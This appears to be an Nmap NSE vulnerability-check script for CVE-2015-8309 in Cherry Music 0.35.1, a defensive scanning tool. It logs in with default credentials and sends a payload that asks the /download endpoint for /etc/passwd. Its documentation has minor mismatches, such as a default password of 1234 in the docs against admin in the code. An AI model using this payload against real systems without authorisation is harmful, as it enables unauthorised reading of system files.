local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local vulns = require "vulns"

description =  [[
Determines if arbitrary files can be accessed via the Cherry Music application.

Cherry Music version 0.35.1 suffers from an arbitrary file disclosure vulnerability. Malicious users could exploit this to gain unauthorized access to arbitrary
 system files.
]]

---
-- @usage nmap --script http-vuln-cve2015-8309.nse <target>
-- @usage nmap --script http-vuln-cve2015-8309.nse --script-args http-vuln-cve2015-8309.path=/path,http-vuln-cve2015-8309.user=admin,http-vuln-cve2015-8309.pass=1234 <target>
--
-- @args http-vuln-cve2015-8309.path Path to URI. Default: /
-- @args http-vuln-cve2015-8309.user Path to URI. Default: admin
-- @args http-vuln-cve2015-8309.paass Path to URI. Default: 1234
--
-- @output
-- 8080/tcp open  http-proxy syn-ack ttl 64
-- | http-vuln-cve2015-8309: 
-- |   VULNERABLE:
-- |   Arbitrary file disclosure in Cherry Music version 0.35.1
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2015-8309
-- |       Cherry Music version 0.35.1 suffers from an arbitrary file disclosure vulnerability. Malicious users could exploit this to gain unauthorized access to arbitrary system files.
-- |           
-- |     Disclosure date: 2015-11-20
-- |     References:
-- |       https://www.exploit-db.com/exploits/40361/
-- |       http://www.fomori.org/cherrymusic/index.html
-- |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8309
--
-- @xmloutput
-- <elem key="state">VULNERABLE</elem>
-- <table key="ids">
-- <elem>CVE:CVE-2015-8309</elem>
-- </table>
-- <table key="description">
-- <elem>Cherry Music version 0.35.1 suffers from an arbitrary file disclosure vulnerability. Malicious users could exploit this to gain unauthorized access to arbitrary system files.&#xa;    </elem>
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="year">2015</elem>
-- <elem key="month">11</elem>
-- <elem key="day">20</elem>
-- </table>
-- </table>
-- <elem key="disclosure">2015-11-20</elem>
-- <table key="refs">
-- <elem>http://www.fomori.org/cherrymusic/index.html</elem>
-- <elem>https://www.exploit-db.com/exploits/40361/</elem>
---

author = "Josh Amishav-Zlatin"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = { "vuln", "discovery", "safe" } 

portrule = shortport.http

local function Req2(host, port, path, SessionCookie)
  local postdata = "value=%5B%22%2Fetc%2Fpasswd%22%5D"
  local response = http.post( host, port, path, 
    {header = {["Content-Type"] = "application/x-www-form-urlencoded"},
     cookies = SessionCookie}, nil, postdata )
  if response.body:find("passwd") then
    return true
  else
    return false
  end
end

local function Req1(host, port, path, user, pass)
  local status
  local postdata = "username=" .. user .. "&login=login&password=" .. pass
  local response = http.post( host, port, path, 
    {header = {["Content-Type"] = "application/x-www-form-urlencoded"}}, 
    nil, postdata )
  
  for _, cookie in pairs(response.cookies) do 
    if cookie.name:find("session_id") then
      stdnse.debug1("session_id: %s", cookie.value)
      local SessionCookie = cookie.name .."="..cookie.value
      status = Req2(host, port, "/download", SessionCookie)
    end
  end
  if status then
    return true
  end
end

action = function(host, port)
  local output = stdnse.output_table()
  local path = stdnse.get_script_args(SCRIPT_NAME .. ".path") or "/"
  local user = stdnse.get_script_args(SCRIPT_NAME .. ".user") or "admin"
  local pass = stdnse.get_script_args(SCRIPT_NAME .. ".pass") or "admin"
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local vuln = {
    title = 'Arbitrary file disclosure in Cherry Music version 0.35.1',
    state = vulns.STATE.NOT_VULN,
    description = [[
Cherry Music version 0.35.1 suffers from an arbitrary file disclosure vulnerability. Malicious users could exploit this to gain unauthorized access to arbitrary system files.
    ]],
    IDS = {CVE = 'CVE-2015-8309'},
    references = {
      'https://www.exploit-db.com/exploits/40361/',
      'http://www.fomori.org/cherrymusic/index.html'
    },
    dates = {
      disclosure = {year = '2015', month = '11', day = '20'},
    }
  }

  local isVuln = Req1(host, port, path, user, pass)
  if isVuln then
    vuln.state = vulns.STATE.VULN
    return vuln_report:make_output(vuln)
  end
  return
end
